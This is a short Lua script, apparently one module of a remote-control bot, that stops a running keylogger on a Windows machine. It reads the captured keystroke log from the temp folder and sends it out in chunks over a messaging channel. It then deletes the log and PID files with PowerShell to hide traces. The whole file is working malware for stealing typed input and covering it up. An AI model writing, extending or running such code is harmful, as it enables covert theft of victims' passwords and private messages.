-- keylog_stop.lua
send_message("🛑 Stopping keylogger and retrieving logs...")

local pidFile = os.getenv("TEMP") .. "\\keylog_pid.txt"
local logFile = os.getenv("TEMP") .. "\\keylog.txt"
local pid = read_file(pidFile)

-- 1. Kill the keylogger process if PID exists
if pid and pid ~= "" then
    pid = pid:gsub("%s+", "")
    run_shell("taskkill /pid " .. pid .. " /f")
    send_message("✅ Keylogger process terminated.")
else
    send_message("ℹ️ No PID file found, process may not be running.")
end

-- 2. Read and send the log file
local content = read_file(logFile)
if content and content ~= "" then
    -- Send in chunks if too long
    if #content < 1900 then
        send_message("Keylog:\n```\n" .. content .. "\n```")
    else
        send_message("⚠️ Log is large, sending in chunks...")
        local start = 1
        while start <= #content do
            local chunk = content:sub(start, start + 1900 - 1)
            send_message("```\n" .. chunk .. "\n```")
            start = start + 1900
        end
    end
else
    send_message("ℹ️ No keystrokes recorded.")
end

-- 3. Clean up files
run_shell('powershell -Command "Remove-Item -Path \\"' .. pidFile .. '\\" -Force -ErrorAction SilentlyContinue"')
run_shell('powershell -Command "Remove-Item -Path \\"' .. logFile .. '\\" -Force -ErrorAction SilentlyContinue"')
send_message("✅ Log and PID files deleted.")